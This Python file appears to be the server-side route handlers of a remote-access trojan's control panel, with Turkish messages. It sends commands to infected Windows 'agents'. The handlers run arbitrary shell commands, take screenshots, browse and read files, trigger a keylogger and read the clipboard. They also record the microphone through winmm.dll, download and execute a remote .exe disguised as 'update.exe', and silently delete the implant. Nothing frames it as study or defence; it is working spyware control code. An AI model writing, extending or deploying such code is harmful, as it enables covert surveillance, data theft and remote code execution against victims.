import asyncio
import json
import base64
from fastapi import Form, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse, Response
from config import active_agents
from helpers import clean_win_path

def get_agent(aid):
    if aid not in active_agents:
        raise HTTPException(404, "Yok")
    return active_agents[aid]

async def run_cmd(aid, cmd, delay):
    a = get_agent(aid)
    p = {"type": "cmd", "value": cmd}
    await a["queue"].put(json.dumps(p))
    await asyncio.sleep(delay)

async def route_cmd(id: str = Form(...), cmd: str = Form(...)):
    await run_cmd(id, cmd, 1.0)
    return RedirectResponse("/", 303)

async def route_sc(id: str = Form(...)):
    a = get_agent(id)
    p = {"type": "screenshot", "value": ""}
    await a["queue"].put(json.dumps(p))
    await asyncio.sleep(2.5)
    return RedirectResponse("/", 303)

async def route_fl(id: str = Form(...), path: str = Form(...)):
    a = get_agent(id)
    clean_p = clean_win_path(path)
    a["current_path"] = clean_p
    p = {"type": "files", "value": clean_p}
    await a["queue"].put(json.dumps(p))
    await asyncio.sleep(1.0)
    return RedirectResponse("/", 303)

async def route_ps(id: str = Form(...)):
    await run_cmd(id, "tasklist", 1.2)
    return RedirectResponse("/", 303)

async def route_kl(id: str = Form(...)):
    a = get_agent(id)
    p = {"type": "kl", "value": ""}
    await a["queue"].put(json.dumps(p))
    await asyncio.sleep(1.2)
    return RedirectResponse("/", 303)

async def route_down(id: str = Form(...), url: str = Form(...)):
    filename = url.split("/")[-1]
    if not filename.endswith(".exe"):
        filename = "update.exe"
    cmd = f"powershell Invoke-WebRequest '{url}' -OutFile '$env:TEMP\\{filename}'; Start-Process '$env:TEMP\\{filename}'"
    await run_cmd(id, cmd, 1.5)
    return RedirectResponse("/", 303)

async def route_clip(id: str = Form(...)):
    cmd = "powershell Get-Clipboard"
    await run_cmd(id, cmd, 1.2)
    return RedirectResponse("/", 303)

async def route_mic(id: str = Form(...)):
    cmd = (
        "powershell Add-Type -TypeDefinition '"
        "using System.Runtime.InteropServices; "
        "public class Sound { "
        "[DllImport(\"winmm.dll\")] "
        "public static extern int mciSendString(string c, System.Text.StringBuilder r, int l, int s); }'; "
        "[Sound]::mciSendString('open new type waveaudio alias r', $null, 0, 0); "
        "[Sound]::mciSendString('record r', $null, 0, 0); "
        "Start-Sleep -Seconds 5; "
        "[Sound]::mciSendString('save r $env:TEMP\\rec.wav', $null, 0, 0); "
        "[Sound]::mciSendString('close r', $null, 0, 0); "
        "[Convert]::ToBase64String([IO.File]::ReadAllBytes('$env:TEMP\\rec.wav'))"
    )
    await run_cmd(id, cmd, 6.0)
    a = get_agent(id)
    res = a.get("last_result", "")
    try:
        audio_data = base64.b64decode(res.strip())
        return Response(
            content=audio_data,
            media_type="audio/wav",
            headers={"Content-Disposition": "attachment; filename=mic_record.wav"}
        )
    except:
        return RedirectResponse("/", 303)

async def route_wipe(id: str = Form(...)):
    cmd = "powershell -NoProfile -WindowStyle Hidden -Command Start-Sleep -Seconds 3; $p = (Get-Process -Id $PID).Path; Remove-Item -Path $p -Force -ErrorAction SilentlyContinue"
    try:
        await run_cmd(id, cmd, 0.5)
    except:
        pass
    return RedirectResponse("/", 303)

async def route_cat(id: str = Form(...), filename: str = Form(...)):
    a = get_agent(id)
    base_p = a.get("current_path")
    if base_p.endswith("\\"):
        full_path = f"{base_p}{filename}"
    else:
        full_path = f"{base_p}\\{filename}"
    full_path = clean_win_path(full_path)
    ext = filename.lower()
    is_img = any(ext.endswith(x) for x in [".jpg", ".png", "jpeg"])
    if is_img:
        cmd = f"powershell [Convert]::ToBase64String([IO.File]::ReadAllBytes('{full_path}'))"
    else:
        cmd = f"powershell Get-Content '{full_path}' -Raw"
    await run_cmd(id, cmd, 1.5)
    res = a.get("last_result", "")
    if is_img:
        try:
            b = base64.b64decode(res.strip())
            m = "image/png"
            if ext.endswith(".jpg"):
                m = "image/jpeg"
            return Response(content=b, media_type=m)
        except:
            return HTMLResponse("Görsel yüklenemedi.")
    return HTMLResponse(f"<pre style='background:#000;color:#ff3333;padding:20px;font-family:monospace;'>{res}</pre>")
